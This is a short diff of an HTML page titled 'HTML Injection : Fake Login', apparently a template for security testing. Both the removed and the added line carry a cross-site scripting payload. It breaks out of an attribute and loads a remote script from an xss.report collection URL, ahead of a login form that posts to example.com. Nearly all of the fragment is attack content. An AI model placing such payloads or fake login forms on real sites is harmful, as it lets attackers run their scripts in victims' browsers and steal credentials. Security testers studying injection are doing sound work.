@@ -6,7 +6,7 @@ info:
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
         <font color="red">Html injection;
-        '"><script src=https://xss.report/c/mrdoos023></script>
+        hello"><script src=https://xss.report/c/mrdoos023></script>
     </div>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
